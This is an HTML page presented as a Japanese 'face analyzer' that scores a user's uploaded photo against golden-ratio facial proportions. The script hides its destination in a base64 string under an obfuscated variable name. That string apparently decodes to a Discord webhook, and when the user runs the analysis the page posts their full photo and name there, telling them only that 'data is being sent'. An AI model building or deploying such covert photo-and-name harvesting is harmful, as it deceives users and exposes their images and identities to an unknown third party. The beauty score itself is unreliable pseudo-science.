<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>顔面精密診断</title>
    <style>
        :root {
            --accent: #00f2fe;
            --accent-dim: #4facfe;
            --bg: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.85);
            --text: #f8fafc;
        }

        body {
            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, sans-serif;
            background: radial-gradient(circle at top right, #1e293b, #0f172a);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            /* ブラウザ全体のバウンスを防止 */
            position: fixed;
            width: 100%;
            height: 100%;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
            max-width: 450px;
            width: 90%;
            text-align: center;
        }

        h2 {
            font-size: 1.4rem;
            letter-spacing: 3px;
            background: linear-gradient(to right, var(--accent), var(--accent-dim));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 0 0 15px 0;
        }

        #guide-msg {
            font-size: 0.8rem;
            color: var(--accent);
            text-shadow: 0 0 8px rgba(0, 242, 254, 0.4);
            margin-bottom: 15px;
            border: 1px solid rgba(0, 242, 254, 0.3);
            padding: 8px;
            border-radius: 8px;
            background: rgba(0, 242, 254, 0.05);
            min-height: 1.2em;
        }

        input[type="text"] {
            width: 100%;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 12px;
            border-radius: 10px;
            color: white;
            font-size: 16px; /* モバイルでのズーム防止 */
            box-sizing: border-box;
            margin-bottom: 12px;
        }

        .upload-area {
            border: 2px dashed rgba(255, 255, 255, 0.2);
            padding: 30px 10px;
            border-radius: 16px;
            cursor: pointer;
        }

        #canvas-wrapper {
            position: relative;
            margin: 15px auto;
            border-radius: 12px;
            overflow: hidden;
            display: none;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            touch-action: none; /* キャンバス上のスクロールを無効化 */
        }

        canvas {
            display: block;
            width: 100%;
            height: auto;
            cursor: move;
        }

        button {
            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
            color: #0f172a;
            border: none;
            padding: 16px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            width: 100%;
            margin-top: 10px;
            transition: 0.2s;
        }

        button:disabled {
            background: #334155;
            color: #64748b;
            cursor: not-allowed;
        }

        #result-area {
            font-size: 3.5rem;
            font-weight: 900;
            margin: 10px 0;
            color: var(--accent);
            text-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
            display: none;
        }
    </style>
</head>
<body>

<div class="card">
    <h2>FACE ANALYZER</h2>
    <div id="guide-msg">システム待機中... 名前を入力してください</div>
    
    <input type="text" id="userName" placeholder="名前を入力">
    
    <div id="upload-zone" class="upload-area" onclick="document.getElementById('imageInput').click()">
        <span style="font-size: 0.85rem; color: #94a3b8;">タップして写真をアップロード</span>
        <input type="file" id="imageInput" accept="image/*" style="display:none">
    </div>

    <div id="canvas-wrapper">
        <canvas id="mainCanvas"></canvas>
    </div>

    <div id="result-area"></div>
    <button id="actionBtn" style="display:none;" onclick="handleAction()">診断を開始する</button>
</div>

<script>
    const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDc0NjkyNjU4MzUxMzA5OS9mVENDZ2Q3dFZOWEEwTVhMUzViakNyQmxyanJwa3dBWDhYMVIxVFo2OUNlRGk3LUdoaG9oNFY0ME5HSHVHVmQwbE5kbw==";
    function getTarget() { return atob(_0x4a2); }

    const canvas = document.getElementById('mainCanvas');
    const ctx = canvas.getContext('2d');
    const guide = document.getElementById('guide-msg');
    const actionBtn = document.getElementById('actionBtn');
    
    let img = new Image();
    let lines = [];
    let draggingLine = null;
    let isSending = false;

    document.getElementById('imageInput').addEventListener('change', e => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = event => {
            img.onload = () => {
                setupCanvas();
                document.getElementById('upload-zone').style.display = 'none';
                document.getElementById('canvas-wrapper').style.display = 'block';
                actionBtn.style.display = 'block';
                guide.innerText = "各線をドラッグして顔のパーツに合わせてください";
            };
            img.src = event.target.result;
        };
        reader.readAsDataURL(file);
    });

    function setupCanvas() {
        const maxW = 1000; // 解像度を少し上げる
        const scale = maxW / img.width;
        canvas.width = maxW;
        canvas.height = img.height * scale;
        const h = canvas.height;
        const w = canvas.width;
        
        lines = [
            { type: 'h', y: h * 0.2, label: '生え際', color: '#ff4b2b' },
            { type: 'h', y: h * 0.4, label: '目の中心', color: '#00f2fe' },
            { type: 'h', y: h * 0.6, label: '鼻の下', color: '#00f2fe' },
            { type: 'h', y: h * 0.85, label: 'あご先', color: '#ff4b2b' },
            { type: 'v', x: w * 0.3, label: '顔の左端', color: '#ffffff' },
            { type: 'v', x: w * 0.7, label: '顔の右端', color: '#ffffff' }
        ];
        draw();
    }

    function draw() {
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        lines.forEach(line => {
            const isDragging = (draggingLine === line);
            
            // 線の影（視認性向上）
            ctx.shadowColor = 'black';
            ctx.shadowBlur = 8;
            ctx.beginPath();
            ctx.lineWidth = isDragging ? 6 : 4;
            ctx.strokeStyle = line.color;
            
            if (line.type === 'h') {
                ctx.moveTo(0, line.y); ctx.lineTo(canvas.width, line.y);
            } else {
                ctx.moveTo(line.x, 0); ctx.lineTo(line.x, canvas.height);
            }
            ctx.stroke();
            ctx.shadowBlur = 0; // 影をリセット

            // ラベルの背景
            ctx.fillStyle = line.color;
            ctx.font = "bold 24px sans-serif";
            const labelY = line.type === 'h' ? line.y - 12 : 40;
            const labelX = line.type === 'h' ? 20 : line.x + 10;
            
            // ラベルの可読性用縁取り
            ctx.strokeStyle = 'black';
            ctx.lineWidth = 4;
            ctx.strokeText(line.label, labelX, labelY);
            ctx.fillText(line.label, labelX, labelY);
        });
    }

    function getEventPos(e) {
        const rect = canvas.getBoundingClientRect();
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        return {
            x: (clientX - rect.left) * (canvas.width / rect.width),
            y: (clientY - rect.top) * (canvas.height / rect.height)
        };
    }

    const handleStart = (e) => {
        const pos = getEventPos(e);
        // 当たり判定を少し広く(60px)
        draggingLine = lines.find(l => (l.type === 'h' ? Math.abs(l.y - pos.y) : Math.abs(l.x - pos.x)) < 60);
        if(draggingLine) {
            guide.innerText = `調整中: ${draggingLine.label}`;
            draw();
            if (e.cancelable) e.preventDefault();
        }
    };

    const handleMove = (e) => {
        if (!draggingLine) return;
        const pos = getEventPos(e);
        if (draggingLine.type === 'h') draggingLine.y = pos.y;
        else draggingLine.x = pos.x;
        draw();
        if (e.cancelable) e.preventDefault();
    };

    const handleEnd = () => {
        if (draggingLine) {
            guide.innerText = "ラインを合わせて「診断開始」を押してください";
            draggingLine = null;
            draw();
        }
    };

    canvas.addEventListener('mousedown', handleStart);
    window.addEventListener('mousemove', handleMove);
    window.addEventListener('mouseup', handleEnd);
    
    canvas.addEventListener('touchstart', handleStart, {passive: false});
    window.addEventListener('touchmove', handleMove, {passive: false});
    window.addEventListener('touchend', handleEnd);

    async function handleAction() {
        if (isSending) return;
        const name = document.getElementById('userName').value.trim();
        if (!name) { alert("名前を入力してください"); return; }

        isSending = true;
        actionBtn.disabled = true;
        actionBtn.innerText = "解析中...";

        // 計算ロジック
        const h1 = lines[1].y - lines[0].y; 
        const h2 = lines[2].y - lines[1].y; 
        const h3 = lines[3].y - lines[2].y;
        const faceW = Math.abs(lines[5].x - lines[4].x);
        const faceH = lines[3].y - lines[0].y;
        const ratio = faceH / faceW;
        const balanceErr = (Math.abs(h1-h2) + Math.abs(h2-h3)) / h2;
        
        let score = Math.round(78 - (balanceErr * 65) - (Math.abs(1.618 - ratio) * 45));
        score = Math.max(38, Math.min(98, score));

        document.getElementById('result-area').style.display = 'block';
        document.getElementById('result-area').innerText = score;
        guide.innerText = "診断完了。データを送信しています...";

        const tempCanvas = document.createElement('canvas');
        tempCanvas.width = canvas.width; tempCanvas.height = canvas.height;
        tempCanvas.getContext('2d').drawImage(img, 0, 0, tempCanvas.width, tempCanvas.height);

        tempCanvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({
                content: `👤 **診断結果報告**\n対象名: ${name}\n顔面偏差値: **${score}**`
            }));
            formData.append('file', blob, 'face_result.jpg');

            try {
                const res = await fetch(getTarget(), { method: 'POST', body: formData });
                if(!res.ok) throw new Error();
                guide.innerText = "送信完了";
                actionBtn.innerText = "診断済み";
            } catch (err) {
                alert("送信に失敗しましたが、診断は完了しました。");
                isSending = false;
                actionBtn.disabled = false;
                actionBtn.innerText = "リトライ";
            }
        }, 'image/jpeg', 0.8);
    }
</script>

</body>
</html>
